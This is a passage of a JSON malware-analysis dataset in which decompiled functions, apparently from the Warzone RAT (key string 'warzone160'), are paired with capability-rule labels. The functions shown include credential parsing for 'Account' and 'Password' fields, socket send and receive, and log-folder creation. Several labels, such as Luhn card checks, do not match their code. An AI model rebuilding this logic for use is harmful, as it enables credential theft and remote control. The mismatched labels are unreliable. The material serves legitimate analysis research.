        "decompiled_code": "\nuint __cdecl fcn.000853f7(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint extraout_ECX;\n    uchar *arg_8h_00;\n    uint arg_ch;\n    uint arg_10h;\n    uint *arg_8h_01;\n    uint var_ch;\n    \n    fcn.00082c1e(&var_ch, **(in_ECX + 0x3c) + 4, (*(in_ECX + 0x40) - **(in_ECX + 0x3c)) + -4);\n    arg_8h_01 = &var_ch;\n    fcn.00082e12(arg_8h_01);\n    arg_8h_00 = &stack0xffffffc8;\n    arg_ch = extraout_ECX;\n    arg_10h = extraout_ECX;\n    fcn.000853aa(&stack0xffffffc8);\n    fcn.00085b00(arg_8h_00, arg_ch, arg_10h, arg_8h_01);\n    fcn.00082dff();\n    return arg_8h;\n}\n",
        "token_count": 249
    },
    "00081dd3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00081dd3(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    for (iVar1 = *(param_1 + -4); iVar1 != 0; iVar1 = iVar1 + -1) {\n        fcn.00082dff();\n    }\n    return param_1 + -4;\n}\n",
        "token_count": 80
    },
    "00084753": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00084753(int32_t arg_8h, uint *arg_ch)\n\n{\n    code *pcVar1;\n    int32_t in_ECX;\n    \n    if (arg_ch != NULL) {\n        if (arg_8h < 0x1f) {\n            if (arg_8h == 0x1e) {\n                fcn.00090e42(arg_ch);\n            }\n            else if (arg_8h < 0xf) {\n                if (arg_8h == 0xe) {\n                    fcn.00082888();\n                }\n                else if (arg_8h == 0) {\n                    fcn.00082aff();\n                }\n                else if (arg_8h == 2) {\n                    fcn.00082aa1();\n                }\n                else if (arg_8h == 4) {\n                    fcn.00082a5a();\n                }\n                else if (arg_8h == 6) {\n                    fcn.00082a07();\n                }\n                else if (arg_8h == 8) {\n                    fcn.000829f8();\n                }\n                else if (arg_8h == 10) {\n                    fcn.0008296e();\n                }\n                else if (arg_8h == 0xc) {\n                    fcn.00082919();\n                }\n            }\n            else if (arg_8h == 0x10) {\n                fcn.00082873();\n            }\n            else if (arg_8h == 0x12) {\n                fcn.0008282b();\n            }\n            else if (arg_8h == 0x14) {\n                fcn.0008fab3(in_ECX, arg_ch[1]);\n            }\n            else if (arg_8h == 0x16) {\n                fcn.0008fa7c();\n            }\n            else if (arg_8h == 0x18) {\n                fcn.00082803();\n            }\n            else {\n                if (arg_8h == 0x1a) {\n                    fcn.000827d9();\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n                if (arg_8h == 0x1c) {\n                    fcn.00082747();\n                }\n            }\n        }\n        else if (arg_8h < 0x2f) {\n            if (arg_8h != 0x2e) {\n                if (arg_8h == 0x20) {\n                    fcn.0008b13c(in_ECX);\n                }\n                else if (arg_8h == 0x22) {\n                    fcn.0008264b(arg_ch);\n                }\n                else if (arg_8h == 0x24) {\n                    fcn.00088431(in_ECX, 0);\n                }\n                else if (arg_8h == 0x26) {\n                    fcn.000883eb();\n                }\n                else if (arg_8h == 0x28) {\n                    fcn.0008c442(in_ECX, *(in_ECX + 0x228));\n                }\n                else if (arg_8h == 0x2a) {\n                    fcn.000825d2(arg_ch);\n                }\n                else if (arg_8h == 0x2c) {\n                    fcn.0008b46d();\n                }\n            }\n        }\n        else if (arg_8h == 0x30) {\n            fcn.00082579(arg_ch);\n        }\n        else if (arg_8h != 0x32) {\n            if (arg_8h == 0x35) {\n                fcn.000827e0();\n            }\n            else if (arg_8h == 0x38) {\n                fcn.0008253b(arg_ch);\n            }\n            else if (arg_8h == 0x3a) {\n                fcn.00082505();\n            }\n            else if (arg_8h == 0x3b) {\n                fcn.000824ee();\n            }\n        }\n        (***arg_ch)(1);\n    }\n    return;\n}\n",
        "token_count": 920
    },
    "00088606": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00088606(uint lpFileName)\n\n{\n    char cVar1;\n    bool bVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    int32_t lpString2;\n    uint uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint8_t *puVar11;\n    uint *arg_8h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    char *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint8_t *var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    \n    iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileA)(lpFileName, 0x80000000, 7, 0, 3, 0, 0);\n    if (iVar4 == -1) {\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(0xffffffff);\n        return;\n    }\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetFileSize)(iVar4, 0);\n    var_ch = uVar5;\n    pcVar6 = fcn.000859a9();\n    var_1ch = pcVar6;\n    fcn.00081052(pcVar6, 0, uVar5);\n    var_14h = 0;\n    (*_sym.imp.KERNEL32.dll_ReadFile)(iVar4, pcVar6, uVar5, &var_14h, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n    iVar7 = fcn.0008590a();\n    var_18h = iVar7;\n    lpString2 = fcn.0008590a();\n    var_8h = fcn.0008590a();\n    bVar2 = false;\n    uVar5 = 0;\n    iVar4 = 0;\n    if (var_ch != 0) {\n        do {\n            cVar1 = pcVar6[uVar5];\n            iVar9 = iVar4;\n            if ((cVar1 - 0x21U < 0x5e) && (cVar1 != '=')) {\n                *(iVar4 + iVar7) = cVar1;\n                iVar9 = iVar4 + 1;\n                if (bVar2) {\n                    if (((((*(iVar4 + -7 + iVar7) == 'P') && (*(iVar4 + -6 + iVar7) == 'a')) &&\n                         (*(iVar4 + -5 + iVar7) == 's')) &&\n                        ((*(iVar4 + -4 + iVar7) == 's' && (*(iVar4 + -3 + iVar7) == 'w')))) &&\n                       ((*(iVar4 + -2 + iVar7) == 'o' && ((*(iVar4 + -1 + iVar7) == 'r' && (*(iVar4 + iVar7) == 'd')))))\n                       ) {\n                        iVar4 = 2;\n                        if (*pcVar6 != -0x30) {\n                            iVar4 = 9;\n                        }\n                        uVar3 = pcVar6[iVar4 + uVar5];\n                        iVar7 = 0;\n                        if (uVar3 < 0x21) goto code_r0x000887ed;\n                        puVar11 = pcVar6 + iVar4 + uVar5;\n                        goto code_r0x000887da;\n                    }\n                }\n                else if ((((7 < iVar9) && (*(iVar4 + -6 + iVar7) == 'A')) && (*(iVar4 + -5 + iVar7) == 'c')) &&\n                        (((*(iVar4 + -4 + iVar7) == 'c' && (*(iVar4 + -3 + iVar7) == 'o')) &&\n                         ((*(iVar4 + -2 + iVar7) == 'u' && ((*(iVar4 + -1 + iVar7) == 'n' && (*(iVar4 + iVar7) == 't')))\n                          ))))) {\n                    iVar4 = 2;\n                    if (*pcVar6 != -0x30) {\n                        iVar4 = 9;\n                    }\n                    iVar10 = 0;\n                    var_10h = iVar4 + uVar5;\n                    uVar3 = var_10h[pcVar6];\n                    if (0x20 < uVar3) {\n                        var_10h = var_10h + pcVar6;\n                        puVar11 = var_10h;\n                        do {\n                            iVar7 = var_18h;\n                            pcVar6 = var_1ch;\n                            if (0x7e < uVar3) break;\n                            puVar11 = puVar11 + 1;\n                            *(iVar10 + lpString2) = uVar3;\n                            iVar10 = iVar10 + 1;\n                            uVar3 = *puVar11;\n                        } while (0x20 < uVar3);\n                    }\n                    *(iVar10 + lpString2) = 0;\n                    bVar2 = true;\n                }\n            }\n            uVar5 = uVar5 + 1;\n            iVar4 = iVar9;\n        } while (uVar5 < var_ch);\n    }\n    goto code_r0x0008889d;\n    while( true ) {\n        *(iVar7 + var_8h) = uVar3;\n        iVar7 = iVar7 + 1;\n        puVar11 = puVar11 + 1;\n        uVar3 = *puVar11;\n        if (uVar3 < 0x21) break;\ncode_r0x000887da:\n        if ((0x7e < uVar3) || (uVar3 == 0x21)) break;\n    }\ncode_r0x000887ed:\n    var_30h = 0;\n    var_2ch = 0;\n    *(iVar7 + var_8h) = 0;\n    var_28h = 0;\n    fcn.00083185(var_8h);\n    fcn.00083185(lpString2);\n    uVar8 = fcn.00082e63(&var_1ch);\n    fcn.000831fd(uVar8);\n    fcn.000858fb();\n    uVar8 = fcn.00082e63(&var_1ch);\n    fcn.000831fd(uVar8);\n    fcn.000858fb();\n    var_24h = 5;\n    uVar8 = fcn.000833ab(0x92428);\n    fcn.000831fd(uVar8);\n    fcn.000858fb();\n    arg_8h = &var_30h;\n    fcn.00081ed8(arg_8h);\n    fcn.00081f0e(arg_8h);\n    fcn.000858fb();\n    fcn.000858fb();\n    fcn.0008138f();\ncode_r0x0008889d:\n    fcn.000858fb();\n    fcn.000858fb();\n    fcn.000858fb();\n    return;\n}\n",
        "token_count": 1576
    },
    "0008de6e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0008de6e(int16_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack28;\n    int16_t *arg_8h_00;\n    int16_t *piVar6;\n    \n    piVar6 = arg_8h;\n    *(in_ECX + 0x20) = arg_8h;\n    if ((*arg_8h == 0x5a4d) && (piVar2 = *(arg_8h + 0x1e) + arg_8h,  *piVar2 == 0x4550)) {\n        if (*(piVar2 + 1) == 0x14c) {\n            *(in_ECX + 0x40) = 1;\n            *(in_ECX + 0x24) = piVar2;\n            uStack28 = 0x8debf;\n            fcn.00082d5a(arg_8h, piVar2[0x15]);\n            iVar1 = *(in_ECX + 0x24);\n            arg_8h = NULL;\n            iVar4 = iVar1 + 0x18 + *(iVar1 + 0x14);\n            if (*(iVar1 + 6) != 0) {\n                do {\n                    arg_8h_00 = piVar6;\n                    fcn.0008e5e2(piVar6, iVar4);\n                    fcn.000821d9(arg_8h_00, iVar4, &stack0xffffffb8, uStack72, uStack68, uStack64, uStack60, uStack56, \n                                 uStack52, uStack48, uStack44);\n                    iVar4 = iVar4 + 0x28;\n                    arg_8h = arg_8h + 1;\n                } while (arg_8h < *(*(in_ECX + 0x24) + 6));\n            }\n        }\n        else if (*(piVar2 + 1) == -0x799c) {\n            iVar5 = 0;\n            *(in_ECX + 0x28) = piVar2;\n            *(in_ECX + 0x40) = 0;\n            uStack28 = 0x8df25;\n            fcn.00082d5a(arg_8h, piVar2[0x15]);\n            iVar1 = *(in_ECX + 0x28);\n            iVar4 = *(iVar1 + 0x14) + 0x18 + iVar1;\n            if (*(iVar1 + 6) != 0) {\n                do {\n                    piVar6 = arg_8h;\n                    fcn.0008e5e2(arg_8h, iVar4);\n                    fcn.000821d9(piVar6, iVar4, &stack0xffffffb8, uStack72, uStack68, uStack64, uStack60, uStack56, \n                                 uStack52, uStack48, uStack44);\n                    iVar5 = iVar5 + 1;\n                    iVar4 = iVar4 + 0x28;\n                } while (iVar5 < *(*(in_ECX + 0x28) + 6));\n            }\n        }\n        uVar3 = 1;\n        *(in_ECX + 0x3c) = 1;\n    }\n    else {\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 829
    },
    "000821d9": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.000821d9(int32_t arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint arg_30h)\n\n{\n    int32_t *piVar1;\n    int32_t **in_ECX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    int32_t *piVar6;\n    uint var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    if (in_ECX[2] < in_ECX[1]) {\n        var_10h = *in_ECX;\n    }\n    else {\n        piVar3 = (in_ECX[2] + 1U) * in_ECX[3];\n        piVar1 = fcn.000859a9();\n        if (piVar1 == NULL) {\n            var_10h = NULL;\n        }\n        else {\n            var_10h = piVar1 + 1;\n            *piVar1 = piVar3;\n            if (piVar3 != NULL) {\n                piVar1 = piVar1 + 0xb;\n                piVar5 = piVar3;\n                do {\n                    *piVar1 = 0;\n                    piVar1[1] = 0;\n                    piVar5 = piVar5 + -1;\n                    piVar1 = piVar1 + 0xc;\n                } while (piVar5 != NULL);\n            }\n        }\n        var_4h = NULL;\n        if (in_ECX[2] != NULL) {\n            var_8h = 0;\n            piVar1 = var_10h;\n            do {\n                piVar5 = *in_ECX;\n                piVar4 = piVar5 + var_8h;\n                piVar6 = piVar1;\n                for (iVar2 = 10; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *piVar6 = *piVar4;\n                    piVar4 = piVar4 + 1;\n                    piVar6 = piVar6 + 1;\n                }\n                fcn.00082c65(piVar5 + var_8h + 10);\n                var_4h = var_4h + 1;\n                var_8h = var_8h + 0x30;\n                piVar1 = piVar1 + 0xc;\n            } while (var_4h < in_ECX[2]);\n        }\n        if (*in_ECX != NULL) {\n            fcn.00081dd3();\n        }\n        *in_ECX = var_10h;\n        in_ECX[1] = piVar3;\n    }\n    piVar1 = &arg_8h;\n    piVar3 = var_10h + in_ECX[2] * 0xc;\n    for (iVar2 = 10; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *piVar3 = *piVar1;\n        piVar1 = piVar1 + 1;\n        piVar3 = piVar3 + 1;\n    }\n    fcn.00082c65(&arg_30h);\n    in_ECX[2] = in_ECX[2] + 1;\n    fcn.00082dff();\n    return;\n}\n",
        "token_count": 797
    },
    "0008dde1": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0008dde1(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t arg_ch_00;\n    uint var_3ch;\n    uint var_14h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    arg_ch_00 = 0;\n    if (*(in_ECX + 0x34) != 0) {\n        var_ch = in_ECX + 0x2c;\n        var_8h = 0;\n        do {\n            iVar1 = var_8h;\n            fcn.000856f9();\n            fcn.0008e618(*(in_ECX + 0x2c) + iVar1);\n            fcn.00083185(&var_3ch);\n            iVar1 = fcn.00083169(arg_ch);\n            fcn.000858fb();\n            fcn.00082dff();\n            if (iVar1 != 0) {\n                fcn.000822e1(arg_8h, arg_ch_00);\n                return;\n            }\n            arg_ch_00 = arg_ch_00 + 1;\n            var_8h = var_8h + 0x30;\n        } while (arg_ch_00 < *(in_ECX + 0x34));\n    }\n    return;\n}\n",
        "token_count": 307
    },
    "00084230": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00084230(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uint uStack96;\n    uchar auStack92 [4];\n    uchar auStack88 [4];\n    uchar auStack84 [52];\n    uint uStack32;\n    uint uStack28;\n    uchar auStack24 [16];\n    \n    uStack28 = 0;\n    uStack32 = 0x11;\n    arg_ch = 0;\n    auStack24 = ZEXT816(0);\n    if (*(in_ECX + 0xc) != 0) {\n        do {\n            arg_8h_00 = fcn.00081521(&uStack96, arg_ch);\n            fcn.00083527(arg_8h_00);\n            fcn.000858fb();\n            iVar1 = fcn.00081521(auStack92, arg_ch);\n            fcn.00083506(*(iVar1 + 4));\n            fcn.000858fb();\n            iVar1 = fcn.00081521(auStack88, arg_ch);\n            fcn.00083506(*(iVar1 + 8));\n            fcn.000858fb();\n            iVar1 = fcn.00081521(auStack84, arg_ch);\n            fcn.00083506(*(iVar1 + 0xc));\n            fcn.000858fb();\n            uStack96 = 0;\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(in_ECX + 0xc));\n    }\n    fcn.0008343f(arg_8h);\n    fcn.0008342b();\n    return arg_8h;\n}\n",
        "token_count": 385
    },
    "000880aa": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000880aa(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint32_t arg_10h;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t arg_ch;\n    uint uVar4;\n    uint *puVar5;\n    uint uStack896;\n    uchar *puStack892;\n    char16_t *pcStack888;\n    uint32_t uStack884;\n    uint32_t uStack880;\n    uint32_t uStack876;\n    uint32_t uStack872;\n    uchar *puVar6;\n    uint32_t noname_1;\n    char16_t *arg_14h;\n    uint32_t arg_18h;\n    uint uStack760;\n    int32_t aiStack748 [2];\n    uchar auStack740 [176];\n    uchar auStack564 [560];\n    \n    (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    puVar5 = &stack0xfffffd14;\n    for (iVar3 = 10; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    fcn.00081052();\n    fcn.00081052();\n    arg_18h = 0;\n    (*_sym.imp.SHELL32.dll_SHGetFolderPathW)();\n    pcVar1 = _sym.imp.KERNEL32.dll_lstrcatW;\n    arg_10h = *0x966ac + 0x10;\n    arg_14h = L\"\\\\Microsoft Vision\\\\\";\n    (*_sym.imp.KERNEL32.dll_lstrcatW)();\n    (*_sym.imp.KERNEL32.dll_CreateDirectoryW)();\n    if (*(*0x966ac + 0xa14) != 0) {\n        fcn.00081052();\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)();\n        (*pcVar1)();\n        puVar6 = &stack0xfffffdcc;\n        fcn.000833ab(puVar6);\n        iVar3 = fcn.0008da4f(puVar6);\n        fcn.00081815();\n        arg_ch = 0;\n        if (*(iVar3 + 8) != 0) {\n            do {\n                puVar6 = &stack0xfffffcb8;\n                noname_1 = arg_ch;\n                fcn.00081862(&stack0xfffffcb8, arg_ch);\n                fcn.00081716(puVar6, noname_1, arg_10h, arg_14h, arg_18h);\n                arg_ch = arg_ch + 1;\n            } while (arg_ch < *(iVar3 + 8));\n        }\n        if (aiStack748[1] != 0) {\n            fcn.00081a75();\n        }\n    }\n    uVar2 = fcn.0008326d();\n    fcn.00083230(0x9274c);\n    fcn.000830fb(uVar2);\n    fcn.000858fb();\n    if (*(*0x966ac + 0xa14) != 0) {\n        (*_sym.imp.KERNEL32.dll_GetLocalTime)();\n        uStack872 = arg_18h & 0xffff;\n        uStack876 = arg_10h & 0xffff;\n        uStack880 = arg_10h >> 0x10;\n        uStack884 = arg_14h >> 0x10;\n        puStack892 = &stack0xfffffd1c;\n        pcStack888 = L\"%02d-%02d-%02d_%02d.%02d.%02d\";\n        uStack896 = 0x88282;\n        (*_sym.imp.USER32.dll_wsprintfW)();\n        iVar3 = *0x966ac + 0x10;\n        uStack872 = 0x8829f;\n        fcn.00083230(iVar3);\n        uStack872 = 0x882a6;\n        fcn.00083230(iVar3);\n        uStack872 = 0;\n        uStack876 = 0x80;\n        uStack880 = 2;\n        uStack884 = 0;\n        pcStack888 = 0x1;\n        puStack892 = 0x10000000;\n        uStack896 = *(*0x966ac + 0xc);\n        uVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)();\n        *(*0x966ac + 4) = uVar2;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar2);\n    }\n    (*_sym.imp.USER32.dll_RegisterClassW)();\n    uStack872 = 0;\n    uStack876 = 0xfffffffd;\n    uStack880 = 0;\n    uStack884 = 0;\n    pcStack888 = NULL;\n    puStack892 = NULL;\n    uStack896 = 0;\n    uVar2 = (*_sym.imp.USER32.dll_CreateWindowExW)(0, uStack760, 0);\n    pcVar1 = _sym.imp.USER32.dll_GetMessageA;\n    puVar5 = &stack0xfffffc98;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    iVar3 = (*_sym.imp.USER32.dll_GetMessageA)(&stack0xfffffc98, uVar2, 0, 0);\n    uVar4 = uStack880;\n    if (iVar3 != 0) {\n        do {\n            uVar4 = 0xffffffff;\n            if (iVar3 == -1) break;\n            (*_sym.imp.USER32.dll_TranslateMessage)(&stack0xfffffc88);\n            (*_sym.imp.USER32.dll_DispatchMessageA)(&stack0xfffffc84);\n            iVar3 = (*pcVar1)(&stack0xfffffc80, uVar2, 0, 0);\n            uVar4 = uStack880;\n        } while (iVar3 != 0);\n    }\n    fcn.000858fb();\n    return uVar4;\n}\n",
        "token_count": 1342
    },
    "00090958": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00090958(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uchar auStack96 [4];\n    uchar auStack92 [4];\n    uchar auStack88 [4];\n    uchar auStack84 [52];\n    uint uStack32;\n    uint uStack28;\n    uchar auStack24 [16];\n    \n    uStack32 = 0x19;\n    arg_ch = 0;\n    uStack28 = 0;\n    auStack24 = ZEXT816(0);\n    if (*(in_ECX + 0xc) != 0) {\n        do {\n            arg_8h_00 = fcn.000820a7(auStack96, arg_ch);\n            fcn.00083527(arg_8h_00);\n            fcn.0008138f();\n            iVar1 = fcn.000820a7(auStack92, arg_ch);\n            fcn.00083527(iVar1 + 4);\n            fcn.0008138f();\n            iVar1 = fcn.000820a7(auStack88, arg_ch);\n            fcn.00083527(iVar1 + 8);\n            fcn.0008138f();\n            iVar1 = fcn.000820a7(auStack84, arg_ch);\n            fcn.00083506(*(iVar1 + 0xc));\n            fcn.0008138f();\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(in_ECX + 0xc));\n    }\n    fcn.0008343f(arg_8h);\n    fcn.0008342b();\n    return arg_8h;\n}\n",
        "token_count": 387
    },
    "00090ce2": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00090ce2(uint *arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t in_ECX;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    uint var_ch;\n    uint var_8h;\n    \n    if (arg_10h == 0) {\n        if (*(in_ECX + 0x18) == 0) {\n            var_8h = 0;\n            var_ch = 0x92514;\n            fcn.00084a3d(&var_ch);\n            fcn.0008d8bb(extraout_ECX_03);\n        }\n    }\n    else if (arg_10h == 1) {\n        if (*(in_ECX + 0x34) == 0) {\n            var_ch = 0x92514;\n            var_8h = 1;\n            fcn.00084a3d(&var_ch);\n            fcn.0008d8bb(extraout_ECX_02);\n        }\n        in_ECX = in_ECX + 0x1c;\n    }\n    else if (arg_10h == 2) {\n        if (*(in_ECX + 0x50) == 0) {\n            var_ch = 0x92514;\n            var_8h = 2;\n            fcn.00084a3d(&var_ch);\n            fcn.0008d8bb(extraout_ECX_01);\n        }\n        in_ECX = in_ECX + 0x38;\n    }\n    else if (arg_10h == 3) {\n        if (*(in_ECX + 0x6c) == 0) {\n            var_ch = 0x92514;\n            var_8h = 3;\n            fcn.00084a3d(&var_ch);\n            fcn.0008d8bb(extraout_ECX_00);\n        }\n        in_ECX = in_ECX + 0x54;\n    }\n    else {\n        if (arg_10h != 4) {\n            *arg_8h = 0;\n            arg_8h[1] = 0;\n            return arg_8h;\n        }\n        if (*(in_ECX + 0x88) == 0) {\n            var_ch = 0x92514;\n            var_8h = 4;\n            fcn.00084a3d(&var_ch);\n            fcn.0008d8bb(extraout_ECX);\n        }\n        in_ECX = in_ECX + 0x70;\n    }\n    fcn.00082e12(in_ECX);\n    return arg_8h;\n}\n",
        "token_count": 614
    },
    "00085042": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00085042(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    bool bVar3;\n    uint *arg_8h_00;\n    uint arg_10h;\n    uint uVar4;\n    uint uVar5;\n    uint var_14h;\n    uint buf;\n    uint var_8h;\n    \n    if (*(in_ECX + 0xc) == -1) {\n        bVar3 = false;\n    }\n    else {\n        uVar1 = fcn.00083185(\"warzone160\");\n        fcn.00082dcc(uVar1);\n        fcn.000858fb();\n        iVar2 = arg_8h;\n        uVar4 = extraout_ECX;\n        uVar5 = extraout_ECX;\n        fcn.00082e12(arg_8h);\n        arg_8h_00 = &var_14h;\n        uVar1 = extraout_ECX_00;\n        arg_10h = extraout_ECX_00;\n        fcn.00082e12(arg_8h_00);\n        fcn.00085b00(arg_8h_00, uVar1, arg_10h, iVar2);\n        iVar2 = (*_sym.imp.WS2_32.dll_send)(*(in_ECX + 0xc), buf, *(arg_8h + 4), 0, uVar4, uVar5);\n        bVar3 = iVar2 != -1;\n        fcn.00082dff();\n        fcn.00082dff();\n    }\n    return bVar3;\n}\n",
        "token_count": 379
    },
    "000850cc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.000850cc(int32_t *arg_8h)\n\n{\n    uint uVar1;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t arg_10h;\n    uint extraout_ECX_01;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EDI;\n    int32_t arg_ch;\n    uint buf;\n    uint uStackY80;\n    uint *puVar4;\n    uint arg_10h_00;\n    uint *puVar5;\n    uint var_38h;\n    int32_t var_30h;\n    uint var_28h;\n    uint optval;\n    uint var_1ch;\n    uint var_18h;\n    uint *var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    \n    fcn.00081130();\n    if (*(extraout_ECX + 0xc) == -1) {\n        return;\n    }\n    var_10h = 4;\n    var_14h = &fcn.000850cc::optval;\n    var_18h = 0x1006;\n    var_1ch = 0xffff;\n    optval = *(extraout_ECX + 0xc);\n    var_ch = unaff_EDI;\n    var_8h = extraout_ECX;\n    (*_sym.imp.WS2_32.dll_setsockopt)();\n    var_30h = 0x8511f;\n    fcn.00081052();\n    uVar1 = fcn.00083185(\"warzone160\");\n    fcn.00082dcc(uVar1);\n    fcn.000858fb();\n    var_14h = NULL;\n    var_10h = 0;\n    do {\n        iVar3 = -1;\n        iVar2 = 0x1000;\n        arg_ch = -2;\n        do {\n            if ((iVar3 != -1) && (iVar3 - arg_ch < 0x1000)) {\n                iVar2 = iVar3 - arg_ch;\n            }\n            var_30h = iVar2;\n            var_ch = (*_sym.imp.WS2_32.dll_recv)();\n            if (var_ch < 1) {\n                (**(*arg_8h + 4))();\n                fcn.00082dff();\n                fcn.00082dff();\n                return;\n            }\n            if ((iVar3 == -1) && (0xb < var_ch)) {\n                var_1ch = 0;\n                var_18h = 0;\n                fcn.00082d5a(&fcn.000850cc::buf, 0xc);\n                puVar5 = &fcn.000850cc::var_1ch;\n                var_30h = extraout_ECX_00;\n                fcn.00082e12(puVar5);\n                puVar4 = &fcn.000850cc::var_30h;\n                iVar3 = arg_10h;\n                fcn.00082e12(puVar4);\n                fcn.00085b00(puVar4, iVar3, arg_10h, puVar5);\n                arg_ch = 0;\n                iVar3 = *(arg_10h + 4) + 0xc;\n                fcn.00082dff();\n                fcn.00082dff();\n            }\n            arg_ch = arg_ch + var_ch;\n            fcn.00082d5a(&fcn.000850cc::buf, var_ch);\n        } while (arg_ch < iVar3);\n        var_30h = *(var_8h + 0x10);\n        fcn.00082d5a(var_30h, arg_ch);\n        puVar5 = &fcn.000850cc::var_14h;\n        fcn.00082e12(puVar5);\n        puVar4 = &fcn.000850cc::var_30h;\n        uStackY80 = 0x85231;\n        uVar1 = extraout_ECX_01;\n        arg_10h_00 = extraout_ECX_01;\n        fcn.00082e12(puVar4);\n        